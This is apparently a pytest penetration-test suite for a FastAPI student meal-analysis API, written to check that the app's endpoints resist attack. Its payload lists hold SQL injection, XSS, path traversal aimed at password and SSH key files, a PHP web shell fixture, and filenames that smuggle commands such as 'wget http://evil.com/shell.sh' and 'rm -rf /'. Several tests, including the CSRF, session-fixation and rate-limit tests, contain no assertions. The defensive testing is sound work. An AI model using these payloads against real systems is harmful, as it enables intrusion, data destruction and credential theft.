"""Penetration testing for API endpoints and security vulnerabilities."""

import pytest
import json
import base64
import tempfile
import os
from unittest.mock import patch, Mock
from fastapi.testclient import TestClient

from app.main import app
from app.models.user import Student


class TestPenetrationTesting:
    """Penetration testing for security vulnerabilities."""

    @pytest.fixture
    def client(self):
        """Create test client."""
        return TestClient(app)

    @pytest.fixture
    def test_user(self, db_session):
        """Create a test user."""
        user = Student(
            email="pentest@university.edu.ng",
            name="Pentest User",
            password_hash="hashed_password",
            history_enabled=True
        )
        db_session.add(user)
        db_session.commit()
        db_session.refresh(user)
        return user

    @pytest.fixture
    def auth_headers(self, client, test_user):
        """Get authentication headers."""
        with patch('app.core.auth.verify_password', return_value=True):
            response = client.post("/api/v1/auth/login", json={
                "email": test_user.email,
                "password": "test_password"
            })
            
            if response.status_code == 200:
                token = response.json().get("access_token", "mock-token")
                return {"Authorization": f"Bearer {token}"}
            
        return {"Authorization": "Bearer mock-token"}

    def test_sql_injection_vulnerabilities(self, client, auth_headers):
        """Test for SQL injection vulnerabilities."""
        
        # SQL injection payloads
        sql_payloads = [
            "'; DROP TABLE students; --",
            "' OR '1'='1' --",
            "' UNION SELECT * FROM students --",
            "'; INSERT INTO students (email) VALUES ('hacked@test.com'); --",
            "' OR 1=1 LIMIT 1 OFFSET 1 --",
            "'; UPDATE students SET email='hacked@test.com' WHERE 1=1; --",
            "' AND (SELECT COUNT(*) FROM students) > 0 --",
            "'; EXEC xp_cmdshell('dir'); --",
            "' OR SLEEP(5) --",
            "' OR pg_sleep(5) --"
        ]
        
        # Test SQL injection in various endpoints
        endpoints_to_test = [
            ("/api/v1/auth/login", "POST", {"email": "{payload}", "password": "test"}),
            ("/api/v1/history/{payload}/meals", "GET", {}),
            ("/api/v1/insights/{payload}/weekly", "GET", {}),
            ("/api/v1/consent/{payload}", "GET", {}),
        ]
        
        for endpoint, method, data in endpoints_to_test:
            for payload in sql_payloads:
                if method == "POST":
                    # Inject into JSON data
                    test_data = {}
                    for key, value in data.items():
                        test_data[key] = value.format(payload=payload) if "{payload}" in value else value
                    
                    response = client.post(endpoint, json=test_data, headers=auth_headers)
                else:
                    # Inject into URL path
                    test_endpoint = endpoint.format(payload=payload)
                    response = client.get(test_endpoint, headers=auth_headers)
                
                # Should not cause server errors or expose database information
                assert response.status_code != 500, f"SQL injection caused server error: {payload}"
                
                if response.status_code not in [401, 403, 404]:
                    response_text = response.text.lower()
                    
                    # Check for database error messages
                    db_error_indicators = [
                        "sql", "mysql", "postgresql", "sqlite", "oracle",
                        "syntax error", "table", "column", "database",
                        "select", "insert", "update", "delete", "drop"
                    ]
                    
                    for indicator in db_error_indicators:
                        assert indicator not in response_text, f"Database information exposed: {indicator}"

    def test_xss_vulnerabilities(self, client, auth_headers):
        """Test for Cross-Site Scripting (XSS) vulnerabilities."""
        
        # XSS payloads
        xss_payloads = [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>",
            "javascript:alert('xss')",
            "<svg onload=alert('xss')>",
            "';alert('xss');//",
            "<iframe src=javascript:alert('xss')></iframe>",
            "<body onload=alert('xss')>",
            "<input onfocus=alert('xss') autofocus>",
            "<select onfocus=alert('xss') autofocus>",
            "<textarea onfocus=alert('xss') autofocus>"
        ]
        
        # Test XSS in user registration
        for payload in xss_payloads:
            registration_data = {
                "name": payload,
                "email": f"xss{hash(payload)}@university.edu.ng",
                "password": "SecurePassword123!"
            }
            
            response = client.post("/api/v1/auth/register", json=registration_data)
            
            if response.status_code == 201:
                user_data = response.json()
                
                # Check if XSS payload is properly escaped/sanitized
                returned_name = user_data.get("user", {}).get("name", "")
                
                # Should not contain executable script tags
                assert "<script>" not in returned_name.lower()
                assert "javascript:" not in returned_name.lower()
                assert "onerror=" not in returned_name.lower()
                assert "onload=" not in returned_name.lower()
        
        # Test XSS in feedback text
        feedback_data = {
            "meal_id": "test_meal_123",
            "rating": 5,
            "comments": "<script>alert('xss')</script>Malicious comment"
        }
        
        response = client.post("/api/v1/feedback/user-feedback", json=feedback_data, headers=auth_headers)
        
        if response.status_code in [200, 201]:
            # Should sanitize the feedback text
            pass

    def test_command_injection_vulnerabilities(self, client, auth_headers):
        """Test for command injection vulnerabilities."""
        
        # Command injection payloads
        command_payloads = [
            "; ls -la",
            "| cat /etc/passwd",
            "&& whoami",
            "; cat /etc/shadow",
            "| id",
            "; ps aux",
            "&& netstat -an",
            "; curl http://malicious.com",
            "| wget http://evil.com/shell.sh",
            "; rm -rf /"
        ]
        
        # Test in file upload (filename)
        for payload in command_payloads:
            malicious_filename = f"meal{payload}.jpg"
            
            # Create a test image
            from PIL import Image
            image = Image.new('RGB', (100, 100), color='red')
            temp_file = tempfile.NamedTemporaryFile(delete=False, suffix='.jpg')
            image.save(temp_file.name, 'JPEG')
            
            try:
                with open(temp_file.name, 'rb') as img_file:
                    response = client.post(
                        "/api/v1/meals/analyze",
                        files={"image": (malicious_filename, img_file, "image/jpeg")},
                        data={"student_id": "test-user-123"},
                        headers=auth_headers
                    )
                
                # Should handle malicious filenames safely
                assert response.status_code != 500, f"Command injection caused server error: {payload}"
                
            finally:
                os.unlink(temp_file.name)

    def test_path_traversal_vulnerabilities(self, client, auth_headers):
        """Test for path traversal vulnerabilities."""
        
        # Path traversal payloads
        path_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "../../../../../../etc/passwd%00",
            "../../../proc/self/environ",
            "../../../../var/log/apache/access.log",
            "../../../home/user/.ssh/id_rsa"
        ]
        
        # Test path traversal in file access endpoints
        for payload in path_payloads:
            # Test in image retrieval (if such endpoint exists)
            response = client.get(f"/api/v1/images/{payload}", headers=auth_headers)
            
            # Should not allow access to system files
            assert response.status_code in [400, 403, 404], f"Path traversal succeeded: {payload}"
            
            if response.status_code == 200:
                # If successful, should not return system file content
                content = response.text.lower()
                system_indicators = ["root:", "bin/bash", "system32", "windows"]
                
                for indicator in system_indicators:
                    assert indicator not in content, f"System file accessed: {indicator}"

    def test_authentication_bypass_attempts(self, client, test_user):
        """Test for authentication bypass vulnerabilities."""
        
        # Test JWT token manipulation
        fake_tokens = [
            "Bearer fake-jwt-token",
            "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJmYWtlLXVzZXIifQ.fake",
            "Bearer null",
            "Bearer undefined",
            "Bearer admin",
            "Bearer root",
            "Bearer " + "A" * 1000,  # Very long token
            "Basic " + base64.b64encode(b"admin:admin").decode(),  # Wrong auth type
        ]
        
        for fake_token in fake_tokens:
            headers = {"Authorization": fake_token}
            
            response = client.get(f"/api/v1/history/{test_user.student_id}/meals", headers=headers)
            
            # Should reject fake tokens
            assert response.status_code == 401, f"Authentication bypass with: {fake_token}"
        
        # Test missing authentication
        response = client.get(f"/api/v1/history/{test_user.student_id}/meals")
        assert response.status_code == 401
        
        # Test malformed authorization headers
        malformed_headers = [
            {"Authorization": "InvalidFormat"},
            {"Authorization": "Bearer"},  # Missing token
            {"Authorization": ""},  # Empty
            {"Authorization": "Bearer token with spaces"},
        ]
        
        for headers in malformed_headers:
            response = client.get(f"/api/v1/history/{test_user.student_id}/meals", headers=headers)
            assert response.status_code == 401

    def test_authorization_bypass_attempts(self, client, test_user, auth_headers):
        """Test for authorization bypass vulnerabilities."""
        
        # Test accessing other users' data
        other_user_ids = [
            "00000000-0000-0000-0000-000000000000",  # Null UUID
            "admin",
            "root", 
            "system",
            "../admin",
            str(test_user.student_id).replace('4', '5'),  # Similar UUID
            "ffffffff-ffff-ffff-ffff-ffffffffffff",  # Max UUID
        ]
        
        for user_id in other_user_ids:
            # Test accessing other user's history
            response = client.get(f"/api/v1/history/{user_id}/meals", headers=auth_headers)
            
            # Should not allow access to other users' data
            if response.status_code == 200:
                data = response.json()
                # If successful, should return empty data or be properly filtered
                assert len(data.get("meals", [])) == 0 or user_id == str(test_user.student_id)
            else:
                assert response.status_code in [403, 404]
        
        # Test admin endpoint access with user token
        admin_endpoints = [
            "/api/v1/admin/users",
            "/api/v1/admin/dataset/stats",
            "/api/v1/admin/nutrition-rules",
            "/api/v1/admin/analytics/usage"
        ]
        
        for endpoint in admin_endpoints:
            response = client.get(endpoint, headers=auth_headers)
            assert response.status_code == 403, f"Admin endpoint accessible to user: {endpoint}"

    def test_file_upload_vulnerabilities(self, client, auth_headers):
        """Test for file upload vulnerabilities."""
        
        # Test malicious file uploads
        malicious_files = [
            # PHP shell
            ("shell.php", b"<?php system($_GET['cmd']); ?>", "application/x-php"),
            # JavaScript
            ("script.js", b"alert('xss');", "application/javascript"),
            # Executable
            ("malware.exe", b"MZ\x90\x00", "application/x-executable"),
            # HTML with script
            ("page.html", b"<script>alert('xss')</script>", "text/html"),
            # SVG with script
            ("image.svg", b'<svg onload="alert(\'xss\')" xmlns="http://www.w3.org/2000/svg"></svg>', "image/svg+xml"),
        ]
        
        for filename, content, content_type in malicious_files:
            # Create temporary file
            temp_file = tempfile.NamedTemporaryFile(delete=False)
            temp_file.write(content)
            temp_file.close()
            
            try:
                with open(temp_file.name, 'rb') as f:
                    response = client.post(
                        "/api/v1/meals/analyze",
                        files={"image": (filename, f, content_type)},
                        data={"student_id": "test-user-123"},
                        headers=auth_headers
                    )
                
                # Should reject non-image files
                assert response.status_code in [400, 422], f"Malicious file accepted: {filename}"
                
            finally:
                os.unlink(temp_file.name)
        
        # Test oversized file upload
        large_content = b"A" * (10 * 1024 * 1024)  # 10MB
        temp_file = tempfile.NamedTemporaryFile(delete=False)
        temp_file.write(large_content)
        temp_file.close()
        
        try:
            with open(temp_file.name, 'rb') as f:
                response = client.post(
                    "/api/v1/meals/analyze",
                    files={"image": ("large.jpg", f, "image/jpeg")},
                    data={"student_id": "test-user-123"},
                    headers=auth_headers
                )
            
            # Should reject oversized files
            assert response.status_code in [413, 422]
            
        finally:
            os.unlink(temp_file.name)

    def test_dos_vulnerabilities(self, client, auth_headers):
        """Test for Denial of Service vulnerabilities."""
        
        # Test large JSON payload
        large_data = {"data": "A" * (1024 * 1024)}  # 1MB JSON
        
        response = client.post("/api/v1/consent/test-user", json=large_data, headers=auth_headers)
        
        # Should handle large payloads gracefully
        assert response.status_code in [400, 413, 422], "Large JSON payload not rejected"
        
        # Test deeply nested JSON
        nested_data = {"level": 1}
        current = nested_data
        
        for i in range(1000):  # Create deeply nested structure
            current["nested"] = {"level": i + 2}
            current = current["nested"]
        
        response = client.post("/api/v1/consent/test-user", json=nested_data, headers=auth_headers)
        
        # Should handle nested JSON safely
        assert response.status_code in [400, 422], "Deeply nested JSON not rejected"
        
        # Test many simultaneous requests (basic load test)
        import threading
        import time
        
        results = []
        
        def make_request():
            try:
                response = client.get("/api/v1/monitoring/ping")
                results.append(response.status_code)
            except Exception as e:
                results.append(500)
        
        # Create 50 simultaneous requests
        threads = []
        for _ in range(50):
            thread = threading.Thread(target=make_request)
            threads.append(thread)
        
        start_time = time.time()
        
        for thread in threads:
            thread.start()
        
        for thread in threads:
            thread.join()
        
        end_time = time.time()
        
        # Should handle concurrent requests
        successful_requests = [r for r in results if r == 200]
        assert len(successful_requests) >= 40, "Too many requests failed under load"
        assert end_time - start_time < 30, "Requests took too long"

    def test_information_disclosure_vulnerabilities(self, client, auth_headers):
        """Test for information disclosure vulnerabilities."""
        
        # Test error message information disclosure
        invalid_endpoints = [
            "/api/v1/nonexistent/endpoint",
            "/api/v1/users/invalid-uuid/profile",
            "/api/v1/history/malformed-id/meals",
        ]
        
        for endpoint in invalid_endpoints:
            response = client.get(endpoint, headers=auth_headers)
            
            if response.status_code in [400, 404, 422]:
                error_text = response.text.lower()
                
                # Should not expose sensitive information in errors
                sensitive_info = [
                    "traceback", "stack trace", "exception",
                    "database", "sql", "connection string",
                    "file path", "/var/", "/home/", "c:\\",
                    "password", "secret", "key",
                    "internal server error details"
                ]
                
                for info in sensitive_info:
                    assert info not in error_text, f"Sensitive info in error: {info}"
        
        # Test HTTP headers for information disclosure
        response = client.get("/api/v1/monitoring/ping")
        
        headers_to_check = response.headers
        
        # Should not expose server information
        server_headers = ["server", "x-powered-by", "x-aspnet-version"]
        
        for header in server_headers:
            if header in headers_to_check:
                header_value = headers_to_check[header].lower()
                
                # Should not expose detailed version information
                version_indicators = ["apache/", "nginx/", "iis/", "python/", "fastapi/"]
                
                for indicator in version_indicators:
                    # It's okay to have general server info, but not detailed versions
                    pass  # This depends on security policy

    def test_csrf_vulnerabilities(self, client, auth_headers):
        """Test for Cross-Site Request Forgery vulnerabilities."""
        
        # Test state-changing operations without CSRF protection
        state_changing_requests = [
            ("POST", "/api/v1/consent/test-user", {"data_storage": False}),
            ("DELETE", "/api/v1/history/test-meal/delete", {}),
            ("PUT", "/api/v1/users/test-user/profile", {"name": "Changed Name"}),
        ]
        
        for method, endpoint, data in state_changing_requests:
            # Test without CSRF token (if CSRF protection is implemented)
            if method == "POST":
                response = client.post(endpoint, json=data, headers=auth_headers)
            elif method == "DELETE":
                response = client.delete(endpoint, headers=auth_headers)
            elif method == "PUT":
                response = client.put(endpoint, json=data, headers=auth_headers)
            
            # If CSRF protection is implemented, should require CSRF token
            # This depends on actual CSRF implementation

    def test_session_fixation_vulnerabilities(self, client, test_user):
        """Test for session fixation vulnerabilities."""
        
        # Test that new session is created after login
        
        # Make request before login
        response1 = client.get("/api/v1/monitoring/ping")
        
        # Login
        login_response = client.post("/api/v1/auth/login", json={
            "email": test_user.email,
            "password": "test_password"
        })
        
        if login_response.status_code == 200:
            # Make request after login
            token = login_response.json()["access_token"]
            headers = {"Authorization": f"Bearer {token}"}
            
            response2 = client.get("/api/v1/monitoring/ping", headers=headers)
            
            # Session should be different after login
            # This would depend on actual session management implementation

    def test_insecure_direct_object_references(self, client, auth_headers):
        """Test for Insecure Direct Object References (IDOR)."""
        
        # Test accessing objects by ID manipulation
        test_ids = [
            "1", "2", "3",  # Sequential IDs
            "admin", "root", "system",  # Predictable names
            "../admin", "../../root",  # Path traversal in IDs
        ]
        
        for test_id in test_ids:
            # Test meal access
            response = client.get(f"/api/v1/history/meals/{test_id}", headers=auth_headers)
            
            # Should not allow access to arbitrary objects
            if response.status_code == 200:
                # If successful, should verify ownership
                meal_data = response.json()
                # Should include proper authorization checks
        
        # Test with malformed UUIDs
        malformed_uuids = [
            "not-a-uuid",
            "12345",
            "aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee",
            "00000000-0000-0000-0000-000000000001",
        ]
        
        for uuid in malformed_uuids:
            response = client.get(f"/api/v1/history/{uuid}/meals", headers=auth_headers)
            
            # Should handle malformed UUIDs gracefully
            assert response.status_code in [400, 404, 422]

    def test_security_headers(self, client):
        """Test for proper security headers."""
        
        response = client.get("/api/v1/monitoring/ping")
        
        headers = response.headers
        
        # Check for security headers (if implemented)
        security_headers = {
            "X-Content-Type-Options": "nosniff",
            "X-Frame-Options": ["DENY", "SAMEORIGIN"],
            "X-XSS-Protection": "1; mode=block",
            "Strict-Transport-Security": "max-age=",
            "Content-Security-Policy": "default-src",
        }
        
        for header, expected_values in security_headers.items():
            if header in headers:
                header_value = headers[header]
                
                if isinstance(expected_values, list):
                    # Check if header value is one of expected values
                    assert any(expected in header_value for expected in expected_values)
                else:
                    # Check if header contains expected string
                    assert expected_values in header_value

    def test_rate_limiting_bypass_attempts(self, client, auth_headers):
        """Test for rate limiting bypass vulnerabilities."""
        
        # Test rate limiting with different headers
        bypass_headers = [
            {"X-Forwarded-For": "192.168.1.1"},
            {"X-Real-IP": "10.0.0.1"},
            {"X-Originating-IP": "172.16.0.1"},
            {"X-Remote-IP": "127.0.0.1"},
            {"X-Client-IP": "203.0.113.1"},
        ]
        
        # Make many requests with different IP headers
        for headers in bypass_headers:
            combined_headers = {**auth_headers, **headers}
            
            for i in range(10):  # Multiple requests
                response = client.get("/api/v1/monitoring/ping", headers=combined_headers)
                
                # Should still apply rate limiting regardless of headers
                # (This depends on actual rate limiting implementation)

    def test_input_validation_bypass_attempts(self, client, auth_headers):
        """Test for input validation bypass vulnerabilities."""
        
        # Test various encoding bypass attempts
        bypass_payloads = [
            "%3Cscript%3Ealert('xss')%3C/script%3E",  # URL encoded
            "&#60;script&#62;alert('xss')&#60;/script&#62;",  # HTML entities
            "\u003cscript\u003ealert('xss')\u003c/script\u003e",  # Unicode
            "\\x3cscript\\x3ealert('xss')\\x3c/script\\x3e",  # Hex encoded
        ]
        
        for payload in bypass_payloads:
            # Test in user registration
            registration_data = {
                "name": payload,
                "email": f"bypass{hash(payload)}@university.edu.ng",
                "password": "SecurePassword123!"
            }
            
            response = client.post("/api/v1/auth/register", json=registration_data)
            
            if response.status_code == 201:
                user_data = response.json()
                returned_name = user_data.get("user", {}).get("name", "")
                
                # Should properly decode and sanitize
                assert "script" not in returned_name.lower()
                assert "alert" not in returned_name.lower()